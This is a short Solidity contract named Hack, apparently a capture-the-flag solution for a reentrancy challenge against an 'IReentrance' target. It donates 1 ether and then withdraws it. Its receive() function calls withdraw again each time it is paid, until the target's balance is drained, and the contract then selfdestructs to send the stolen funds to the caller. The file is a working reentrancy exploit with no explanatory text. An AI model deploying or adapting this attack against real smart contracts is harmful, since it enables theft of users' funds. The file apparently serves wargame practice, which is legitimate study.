// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./IReentrance.sol";

contract Hack {
  IReentrance private immutable target;

  constructor(address _target) public {
    target = IReentrance(_target);
  }

  function attack() external payable {
    target.donate{value: 1e18}(address(this));
    target.withdraw(1e18);

    require(address(target).balance == 0, "target balance > 0");
    selfdestruct(payable(msg.sender));
  }

  
  function min(uint256 x, uint256 y) private pure returns(uint256) {
    return x <= y ? x : y;
  }

  receive() external payable {
    uint256 amount = min(1e18, address(target).balance);
    if (amount > 0) {
      target.withdraw(amount);
    }
  }
}
